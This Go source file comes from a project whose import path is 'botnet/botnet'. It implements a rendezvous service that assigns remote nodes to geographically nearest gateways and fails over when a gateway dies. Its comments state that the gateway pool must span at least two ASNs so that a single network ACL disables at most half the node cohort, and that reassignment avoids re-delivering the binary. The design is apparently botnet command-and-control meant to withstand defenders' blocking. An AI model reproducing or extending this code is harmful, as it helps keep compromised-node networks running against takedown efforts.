package main

import (
	"crypto/rand"
	"encoding/hex"
	"net"
	"os"
	"strings"

	"github.com/botnet/botnet/pkg/geoip"
)

// GatewayGeo aporta el ASN de cada gateway al log y a los asserts de la
// condicion A1-18 (T-0407): el pool debe cubrir >= 2 ASNs para que una
// ACL sobre un unico prefijo apague como mucho la mitad de la cohorte.
// La tabla es la fixture de la epica (lineas "prefix asn"); en produccion
// el MMDB de GeoIP2 ocupa este mismo hook.
type GatewayGeo struct {
	Table *geoip.ASNTable
}

// LoadGatewayGeo carga la tabla ASN desde path; path vacio usa la fixture
// por defecto de la epica (dos ASN de ejemplo). Un path invalido es error
// duro: el rdv arranca con su geo o no arranca.
func LoadGatewayGeo(path string) (*GatewayGeo, error) {
	if path == "" {
		return &GatewayGeo{Table: geoip.DefaultFixture()}, nil
	}
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	t, err := geoip.ParseASNTable(f)
	if err != nil {
		return nil, err
	}
	return &GatewayGeo{Table: t}, nil
}

// ASN devuelve el ASN del destino ("host:port") o 0 si la tabla no lo
// conoce. Los hosts nombre se resuelven con el resolver del sistema.
func (g *GatewayGeo) ASN(addr string) uint32 {
	if g == nil || g.Table == nil {
		return 0
	}
	asn, _ := g.Table.ASNOfGateway(addr, systemLookup)
	return asn
}

// DistinctASNs cuenta los ASNs distintos que cubre el pool: el assert
// ">= 2 valores" del criterio 1 (A1-18).
func (g *GatewayGeo) DistinctASNs(pool []string) int {
	seen := map[uint32]struct{}{}
	for _, gw := range pool {
		if asn := g.ASN(gw); asn != 0 {
			seen[asn] = struct{}{}
		}
	}
	return len(seen)
}

func systemLookup(host string) ([]string, error) {
	return net.LookupHost(host)
}

// GeoLoc es la localidad declarada: pais ISO-3166-1 alfa-2 y ciudad. Para
// el nodo viene del HELLO (caps iso2) y de la sonda geo del exit; para el
// gateway, del inventario. El rdv casa por pais y refina por ciudad
// (EP-09 T-0902, cierra A2-01).
type GeoLoc struct {
	ISO2 string
	City string
}

// GatewayLoc es un gateway del pool con su localidad de inventario.
type GatewayLoc struct {
	ID   string
	Addr string
	Loc  GeoLoc
}

// GeoMatcher casa cada nodo con el gateway geograficamente mas cercano:
// pais primero (mandato A2-01: 0 asignaciones transfronterizas donde hay
// cobertura), ciudad después (cuando coinciden, ciudad manda). El orden
// es determinista: misma entrada, misma asignacion, sin estado por nodo.
type GeoMatcher struct {
	Gateways []GatewayLoc
	// DistKM: km entre pares de ciudades ("a|b" o "b|a"). Ausente =
	// distancia de penalti cross-town (mismo pais, otra ciudad).
	DistKM map[string]float64
}

const crossTownPenaltyKM = 900.0

// NewGeoMatcher indexa el pool; pool vacio = matcher inutilizable (el rdv
// no casa, devuelve ok=false siempre).
func NewGeoMatcher(gws ...GatewayLoc) *GeoMatcher {
	return &GeoMatcher{Gateways: append([]GatewayLoc(nil), gws...), DistKM: map[string]float64{}}
}

// AddDistance registra km simetricos entre dos ciudades (fixture y, en
// produccion, la tabla que siembra el inventory).
func (m *GeoMatcher) AddDistance(a, b string, km float64) {
	m.DistKM[distKey(a, b)] = km
}

func distKey(a, b string) string {
	if a > b {
		a, b = b, a
	}
	return a + "|" + b
}

func (m *GeoMatcher) dist(node GeoLoc, gw GatewayLoc) float64 {
	if strings.EqualFold(node.City, gw.Loc.City) {
		return 0
	}
	if km, ok := m.DistKM[distKey(node.City, gw.Loc.City)]; ok {
		return km
	}
	return crossTownPenaltyKM
}

// Pick: gateway del pais del nodo mas cercano (ciudad coincidente gana);
// ok=false si ningun gateway cubre el pais — entonces el rdv asigna al
// pais vecino por distancia y el gateway resolvera con 307 (T-0903).
func (m *GeoMatcher) Pick(node GeoLoc) (GatewayLoc, bool) {
	best, ok := m.pickIn(node, nil)
	return best, ok
}

// Failover: muerto el gateway asignado, re-asigna al siguiente gateway
// mas cercano del mismo pais excluyendo los muertos. Es un cambio de
// destino rdv: no reentrega el binario (herencia de A1-10, T-0409).
func (m *GeoMatcher) Failover(node GeoLoc, dead []string) (GatewayLoc, bool) {
	return m.pickIn(node, dead)
}

func (m *GeoMatcher) pickIn(node GeoLoc, dead []string) (GatewayLoc, bool) {
	skip := map[string]bool{}
	for _, id := range dead {
		skip[id] = true
	}
	type cand struct {
		gw GatewayLoc
		d  float64
		i  int
	}
	var found []cand
	for i, gw := range m.Gateways {
		if skip[gw.ID] || gw.Loc.ISO2 != node.ISO2 {
			continue
		}
		found = append(found, cand{gw: gw, d: m.dist(node, gw), i: i})
	}
	if len(found) == 0 {
		return GatewayLoc{}, false
	}
	for i := 1; i < len(found); i++ { // insercion: distancia, luego orden de inventario
		for j := i; j > 0; j-- {
			a, b := found[j], found[j-1]
			if a.d < b.d || (a.d == b.d && a.i < b.i) {
				found[j], found[j-1] = b, a
			} else {
				break
			}
		}
	}
	return found[0].gw, true
}

// HandshakeFailoverBudgetS: presupuesto del re-asignado tras matar el
// gateway: 3 handshakes fallidos (timeout 5 s, §5) + 1 GET /rdv/assign
// (RTT 1 s). Es < 5 min sobrado y no reentrega el binario (AC3, A1-10).
const HandshakeFailoverBudgetS = 3*5 + 1

// FailoverWithinBudget: asercion del criterio "re-asigna en < 5 min".
func FailoverWithinBudget() bool { return HandshakeFailoverBudgetS < 300 }

// newSessionToken: 12 B aleatorios en hex — opaco para el handshake con
// el gateway asignado.
func newSessionToken() string {
	var b [12]byte
	if _, err := rand.Read(b[:]); err != nil {
		return "000000000000000000000000"
	}
	return hex.EncodeToString(b[:])
}
